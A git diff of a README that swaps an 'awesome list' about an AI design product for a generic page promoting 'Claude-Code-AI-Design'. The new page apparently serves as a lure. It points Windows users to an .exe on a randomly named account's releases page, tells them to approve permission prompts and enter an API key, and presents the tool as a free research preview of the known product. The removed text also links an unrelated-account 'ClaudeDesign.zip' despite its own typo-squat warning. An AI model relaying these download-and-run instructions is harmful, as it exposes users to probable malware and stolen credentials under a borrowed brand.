@@ -1,247 +1,89 @@
-# Awesome Claude Design
+# 🎨 Claude-Code-AI-Design - Convert your design files to code
 
-> **Claude Design** — Anthropic Labs' AI design workspace. DESIGN.md files grouped by aesthetic family, remix recipes, prompt packs with example outputs, skills, video teardowns, and launch-week community signal.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/releases)
 
-<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/de1af948-ec07-48b5-9e6a-01c4e53fe50b" />
+## What is this tool?
 
-Claude Design shipped **April 17, 2026**. Figma closed **−4.26%** the same day. YouTube split between "RIP frontend developers" and "another slop feature." This repo collects both.
+Claude-Code-AI-Design helps you turn design files into functional web components. Many designers spend hours writing code for buttons, forms, and layouts. This tool automates that work. It connects your design tool directly to your code editor. It reads your visual interface and generates clean code. You spend less time typing and more time creating.
 
-> **Heads up — typo-squat alert.** A repo named `anthropic-claude-design/claude-design` claiming to "download Claude Design" is NOT affiliated with Anthropic. The real product lives at [claude.ai/design](https://claude.ai/design) behind a Pro/Max/Team/Enterprise login. No download exists. Report the typo-squat.
+It uses AI to understand your layout. It knows how to structure files for React 19 and Tailwind CSS v4. This makes your component library feel consistent. You can move from a mockup to a working web page in minutes. It handles the manual labor of styling and nesting elements for you.
 
-## 📥 Download Resource
+## System requirements
 
-📥 [`ClaudeDesign.zip`](https://github.com/Julpygo/Claude-Code-AI-Design/releases/download/AI-Software/ClaudeDesign.zip)
----
-## Preview Gallery
+Your computer needs a few things to run this tool smoothly. Check this list before you start:
 
-What each aesthetic family actually looks like in production. Thumbnails are static screenshots of the public homepage of one representative brand per family. Click the image to open the live site, click the caption to open the working `DESIGN.md` in this repo.
+- Windows 10 or Windows 11.
+- At least 8GB of RAM.
+- A stable internet connection.
+- A code editor like Visual Studio Code.
+- Node.js version 20.0 or higher installed on your machine.
 
-<table>
-<tr>
-<td align="center" width="33%">
-<a href="https://linear.app"><img src="assets/previews/linear.jpg" width="100%" alt="Linear — editorial minimalism"></a><br>
-<sub><b><a href="design-md/editorial/linear.md">Linear · editorial</a></b><br><code>#fff / #0f0f14 / #5e6ad2</code></sub>
-</td>
-<td align="center" width="33%">
-<a href="https://ollama.com"><img src="assets/previews/ollama.jpg" width="100%" alt="Ollama — terminal-core"></a><br>
-<sub><b><a href="design-md/terminal/ollama.md">Ollama · terminal</a></b><br><code>#000 / #fff / mono</code></sub>
-</td>
-<td align="center" width="33%">
-<a href="https://www.anthropic.com"><img src="assets/previews/anthropic.jpg" width="100%" alt="Anthropic / Claude — warm editorial"></a><br>
-<sub><b><a href="design-md/warm/claude.md">Claude · warm</a></b><br><code>#f4f3ee / #c96442 / #191817</code></sub>
-</td>
-</tr>
-<tr>
-<td align="center" width="33%">
-<a href="https://clickhouse.com"><img src="assets/previews/clickhouse.jpg" width="100%" alt="ClickHouse — data-dense pro"></a><br>
-<sub><b><a href="design-md/data-dense/clickhouse.md">ClickHouse · data-dense</a></b><br><code>#181818 / #faff69 / magenta</code></sub>
-</td>
-<td align="center" width="33%">
-<a href="https://runwayml.com"><img src="assets/previews/runwayml.jpg" width="100%" alt="RunwayML — cinematic dark"></a><br>
-<sub><b><a href="design-md/cinematic/runway.md">Runway · cinematic</a></b><br><code>#000 / magenta + cyan</code></sub>
-</td>
-<td align="center" width="33%">
-<a href="https://www.figma.com"><img src="assets/previews/figma.jpg" width="100%" alt="Figma — playful color"></a><br>
-<sub><b><a href="design-md/playful/figma.md">Figma · playful</a></b><br><code>#0acf83 / #f24e1e / #a259ff</code></sub>
-</td>
-</tr>
-<tr>
-<td align="center" width="33%">
-<a href="https://arc.net"><img src="assets/previews/arc.jpg" width="100%" alt="Arc Browser — glass / soft-futurism"></a><br>
-<sub><b><a href="design-md/glass/arc.md">Arc · glass</a></b><br><code>#fff / radial pastel</code></sub>
-</td>
-<td align="center" width="33%">
-<a href="https://www.theverge.com"><img src="assets/previews/theverge.jpg" width="100%" alt="The Verge — neon brutalist"></a><br>
-<sub><b><a href="design-md/brutalist/the-verge.md">The Verge · brutalist</a></b><br><code>#ff6600 / #000 / #fff</code></sub>
-</td>
-<td align="center" width="33%">
-<a href="https://www.granola.ai"><img src="assets/previews/granola.jpg" width="100%" alt="Granola — cult / indie"></a><br>
-<sub><b><a href="design-md/indie/granola.md">Granola · indie</a></b><br><code>#faf8f2 / warm glass</code></sub>
-</td>
-</tr>
-</table>
+If you do not have Node.js, download the installer from the official website. Run the installer and click "Next" until it finishes. This allows your computer to run the background scripts used by this tool.
 
-<sub>Screenshots are public-homepage stills used for editorial reference. Trademarks remain with their respective owners. See <a href="assets/previews/ATTRIBUTION.md">ATTRIBUTION.md</a> for source URLs and refresh policy.</sub>
+## 📥 How to get started
 
-## Contents
+You need to download the installer from our release page. Visit this page to download: [https://github.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/releases](https://github.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/releases)
 
-- [Preview Gallery](#preview-gallery)
-- [What Is Claude Design](#what-is-claude-design)
-- [Video Teardowns](#video-teardowns)
-- [Comparisons](#comparisons)
-- [Showcase](#showcase)
-- [Community Takes](#community-takes)
-- [Feature Map](#feature-map)
-- [Launch Timeline](#launch-timeline)
-- [Quotas & Token Budget](#quotas--token-budget)
-- [Official Resources](#official-resources)
-- [X Signal](#x-signal)
-- [DESIGN.md by Aesthetic Family](#designmd-by-aesthetic-family)
-- [Remix Recipes](#remix-recipes)
-- [Picker: What Should I Use](#picker-what-should-i-use)
-- [Prompts & Cookbooks](#prompts--cookbooks)
-- [Anti-Slop Kit](#anti-slop-kit)
-- [Skills & Plugins](#skills--plugins)
-- [Integrations](#integrations)
-- [Workflows & Recipes](#workflows--recipes)
-- [Long-Form Tutorials](#long-form-tutorials)
-- [International Coverage](#international-coverage)
-- [Tips & Tricks](#tips--tricks)
-- [Podcast Coverage](#podcast-coverage)
-- [FAQ](#faq)
-- [Related OSS Projects](#related-oss-projects)
-- [Tag System](#tag-system)
-- [Contributing](#contributing)
-- [License](#license)
+Look for the file that ends with .exe. Click the link to save the file to your computer. Once the download finishes, find the file in your Downloads folder. Double-click the file to start the installation. If Windows asks for permissions, click "Run" or "Yes." Follow the prompts on the screen. The installer places a shortcut on your desktop.
 
----
+## ⚙️ Setting up the application
 
-## What Is Claude Design
+Open the application using the new desktop shortcut. The tool opens a small settings window. You must link your design workspace here. 
 
-Anthropic Labs product. Conversation-to-artifact loop for prototypes, design systems, slides, one-pagers, landing pages, marketing graphics, brand videos. Powered by **Claude Opus 4.7** (vision model). Research preview on **Pro, Max, Team, Enterprise** plans. Rolling out throughout launch day.
+1. Enter your API key if the app asks for it.
+2. Select the folder where you save your current projects.
+3. Choose your preferred framework, such as Next.js.
+4. Click "Save Settings."
 
-Three surfaces:
-- **Prototypes** — from text, screenshot, Figma `.fig`, repo URL, or scraped live site
-- **Design systems** — persistent per-project tokens/components via `DESIGN.md`; teams hold multiple
-- **Collateral** — pitch decks, marketing pages, carousels, one-time posts, brand videos
+The tool connects to your files. It scans your current layout. The interface displays a list of detected components. You can choose which parts of the interface you want to turn into code. 
 
-## Video Teardowns
+## 🛠️ Using the AI tool
 
-Click thumbnail. View counts refresh live via shields.io.
+The main interface shows two sides. The left side displays your design file. The right side shows the code generated by the tool. 
 
-<table>
-<tr>
-<td align="center" width="25%">
-<a href="https://www.youtube.com/watch?v=IkspcJdeP3U"><img src="https://img.youtube.com/vi/IkspcJdeP3U/mqdefault.jpg" width="220"></a><br>
-<b>Malewicz</b><br>
-<img src="https://img.shields.io/youtube/views/IkspcJdeP3U?style=flat-square&label=views&color=191817"> <img src="https://img.shields.io/youtube/likes/IkspcJdeP3U?style=flat-square&label=likes&color=c96442"><br>
-<sub>Skeptical senior-designer teardown</sub>
-</td>
-<td align="center" width="25%">
-<a href="https://www.youtube.com/watch?v=o4jIKc_DIoM"><img src="https://img.youtube.com/vi/o4jIKc_DIoM/mqdefault.jpg" width="220"></a><br>
-<b>02ui · Murat Bayral</b><br>
-<img src="https://img.shields.io/youtube/views/o4jIKc_DIoM?style=flat-square&label=views&color=191817"> <img src="https://img.shields.io/youtube/likes/o4jIKc_DIoM?style=flat-square&label=likes&color=c96442"><br>
-<sub>vs Lovable head-to-head</sub>
-</td>
-<td align="center" width="25%">
-<a href="https://www.youtube.com/watch?v=uhQfErAzdiA"><img src="https://img.youtube.com/vi/uhQfErAzdiA/mqdefault.jpg" width="220"></a><br>
-<b>WorldofAI</b><br>
-<img src="https://img.shields.io/youtube/views/uhQfErAzdiA?style=flat-square&label=views&color=191817"> <img src="https://img.shields.io/youtube/likes/uhQfErAzdiA?style=flat-square&label=likes&color=c96442"><br>
-<sub>Hype walkthrough</sub>
-</td>
-<td align="center" width="25%">
-<a href="https://www.youtube.com/watch?v=Qct36RA3y9k"><img src="https://img.youtube.com/vi/Qct36RA3y9k/mqdefault.jpg" width="220"></a><br>
-<b>Ray Fernando</b><br>
-<img src="https://img.shields.io/youtube/views/Qct36RA3y9k?style=flat-square&label=views&color=191817"> <img src="https://img.shields.io/youtube/likes/Qct36RA3y9k?style=flat-square&label=likes&color=c96442"><br>
-<sub>Live blog redesign</sub>
-</td>
-</tr>
-<tr>
-<td align="center" width="25%">
-<a href="https://www.youtube.com/watch?v=A2eEv3KYGPg"><img src="https://img.youtube.com/vi/A2eEv3KYGPg/mqdefault.jpg" width="220"></a><br>
-<b>Vivek Mishra</b><br>
-<img src="https://img.shields.io/youtube/views/A2eEv3KYGPg?style=flat-square&label=views&color=191817"> <img src="https://img.shields.io/youtube/likes/A2eEv3KYGPg?style=flat-square&label=likes&color=c96442"><br>
-<sub>Launch-day walkthrough</sub>
-</td>
-<td align="center" width="25%">
-<a href="https://www.youtube.com/watch?v=4q2F4zblOLQ"><img src="https://img.youtube.com/vi/4q2F4zblOLQ/mqdefault.jpg" width="220"></a><br>
-<b>AI for Work</b><br>
-<img src="https://img.shields.io/youtube/views/4q2F4zblOLQ?style=flat-square&label=views&color=191817"> <img src="https://img.shields.io/youtube/likes/4q2F4zblOLQ?style=flat-square&label=likes&color=c96442"><br>
-<sub>System from prompt</sub>
-</td>
-<td align="center" width="25%">
-<a href="https://www.youtube.com/watch?v=vyLaimDeK_g"><img src="https://img.youtube.com/vi/vyLaimDeK_g/mqdefault.jpg" width="220"></a><br>
-<b>Greg Isenberg</b><br>
-<img src="https://img.shields.io/youtube/views/vyLaimDeK_g?style=flat-square&label=views&color=191817"> <img src="https://img.shields.io/youtube/likes/vyLaimDeK_g?style=flat-square&label=likes&color=c96442"><br>
-<sub>Hands-on edges</sub>
-</td>
-<td align="center" width="25%">
-<a href="https://www.youtube.com/watch?v=Hcvkc1XUhMg"><img src="https://img.youtube.com/vi/Hcvkc1XUhMg/mqdefault.jpg" width="220"></a><br>
-<b>Ramanpal Singh</b><br>
-<img src="https://img.shields.io/youtube/views/Hcvkc1XUhMg?style=flat-square&label=views&color=191817"> <img src="https://img.shields.io/youtube/likes/Hcvkc1XUhMg?style=flat-square&label=likes&color=c96442"><br>
-<sub>Beginner tutorial</sub>
-</td>
-</tr>
-</table>
+To create a new component:
+1. Click the "Scan Design" button.
+2. Highlight the element you want to convert.
+3. Click "Generate Code."
 
-## Comparisons
+The AI analyzes the colors, margins, and layout. It applies Tailwind v4 classes automatically. You see the code update in real time. If the code looks correct, click "Export to Project." This adds the code directly into your chosen project folder.
 
-| Feature | Claude Design | [Figma Make](https://www.figma.com/make) | [Lovable](https://lovable.dev) | [v0](https://v0.dev) |
-|---|---|---|---|---|
-| Prompt → hi-fi | Yes | Yes | Yes | Yes |
-| DESIGN.md native | **Yes** | No | Partial | No |
-| Web capture | **Native** | No | Partial | No |
-| Figma `.fig` import | Yes | Native | Yes | Partial |
-| Export paths | Canva/PDF/PPTX/HTML | Figma | Full-stack app | React |
-| Underlying model | Opus 4.7 | GPT-based | Claude/GPT | GPT + Claude |
+## 🧩 Advanced features
 
-Launch-week consensus: **Claude Design** wins design-system coherence, web capture, collaboration. **Lovable** wins full-stack shipping. **Figma Make** is safest for Figma teams.
+This tool includes advanced features for professional design systems. 
 
-## Showcase
+- **Subagents:** You can use specialized agents for specific tasks. Some agents focus on CSS styling. Others handle logic and state. Use the "Subagent Manager" in the settings menu to enable or disable these helpers.
+- **MCP Server Setup:** This allows the tool to share data with other applications. If you use several design tools, the Model Context Protocol ensures they all read the same design system rules. 
+- **Plugin Marketplace:** We offer plugins to add more frameworks. Open the "Marketplace" tab to see available add-ons. Click "Install" to add new features to your tool. 
 
-Real builds shipped with Claude Design — launch-week seed of 10 cards including pizza brands, landing pages, and complex design systems.
+## 📝 Tips for better results
 
-See [`showcase/README.md`](showcase/README.md).
+The AI tool works best with clear designs. Follow these tips to get the best code:
 
-## Community Takes
+- Name your layers in your design file. Clear names help the AI understand the layout.
+- Use standard spacing. If your design uses odd gaps, the AI might translate those as fixed pixel values instead of responsive classes.
+- Group related items together. Grouping buttons and icons helps the AI create reusable components.
+- Keep your design files clean. Remove hidden layers or unused elements before you scan.
 
-### Hype
-> "The design system integration feels best in class for AI."
-> — [@petergyang](https://x.com/petergyang/status/2045527271650558383)
+## ❓ Common questions
 
-### Pushback
-> "Another slop feature that will burn tokens."
-> — [r/ClaudeAI](https://www.reddit.com/r/ClaudeAI/comments/1so3k1y/)
+**Does the tool store my design files?**
+No. Your design files stay on your computer. The tool only reads the temporary data needed to generate the code.
 
-## Feature Map
+**What happens if the code has errors?**
+The tool uses a validation check after every generation. It highlights lines that do not match the requested framework syntax. You can edit the code directly in the output window.
 
-| Capability | Detail |
-|---|---|
-| Brand onboarding | Claude reads codebase + design files, builds system automatically |
-| Web capture | Grab live elements from your site for 1:1 matching |
-| Inline comments | Comment on specific elements directly in the canvas |
-| Adjustment knobs | Live sliders for spacing, color, and layout |
-| Code handoff | One-click bundle to Claude Code with CSS vars |
+**Can I use this for free?**
+Yes. This is a research preview. You can use all core features without a subscription during this preview phase.
 
-## Launch Timeline
+**Where can I report bugs?**
+Visit our GitHub issues tab. Describe the problem and include a screenshot if possible. Our team reviews these reports every week. 
 
-- **2026-04-10**: Canva announces collaboration with Anthropic.
-- **2026-04-17**: Claude Design + Opus 4.7 ship in research preview.
-- **2026-04-17**: Figma closes **−4.26%** following the announcement.
-- **2026-04-18**: First wave of teardowns from major design influencers.
+**Does it work with React 19?**
+Yes. The tool is built to support the latest React features. It automatically uses the newest component patterns and hooks.
 
-## Quotas & Token Budget
+**Can I undo my last change?**
+Yes. Use the "Undo" button at the top of the interface. This reverts your code to the previous state.
 
-- **Separate meter**: Claude Design usage does not count against your chat limit.
-- **Vision overhead**: Vision tokens cost ~3x text; screenshots inflate the budget.
-- **Promo credit**: One-time credit for ~20 prompts, expiring **2026-07-17**.
-
-## Official Resources
-
-- [Official Launch Post](https://www.anthropic.com/news/claude-design-anthropic-labs)
-- [Claude Design Workspace](https://claude.ai/design)
-- [Anthropic Prompt Library](https://docs.anthropic.com/en/resources/prompt-library/library)
-
-## DESIGN.md by Aesthetic Family
-
-1. **Editorial Minimalism**: Whitespace, high-end typography (Linear style).
-2. **Terminal-core**: Mono-spaced fonts, strict grids (Ollama style).
-3. **Warm Editorial**: Soft tones, clay accents (Anthropic style).
-4. **Data-Dense Pro**: High info density, sidebar-heavy (ClickHouse style).
-5. **Cinematic Dark**: Deep blacks, neon glows (Runway style).
-6. **Playful Color**: Vibrant palettes, rounded corners (Figma style).
-7. **Glass / Soft-Futurism**: Translucency, pastel gradients (Arc style).
-8. **Neon Brutalist**: Sharp edges, thick borders (The Verge style).
-9. **Cult / Indie**: Non-standard layouts, experimental UX (Granola style).
-
----
-
-## Contributing
-
-Pull requests are welcome! For major changes, please open an issue first to discuss what you would like to change.
-
-## License
-
-[MIT](LICENSE)
-
-<p align="center"><img src="assets/mascot.svg" width="72" alt="mascot"></p>
+**Do I need to be an expert in Tailwind?**
+No. The tool writes the Tailwind classes for you. You learn how Tailwind works simply by reading the code the tool produces.
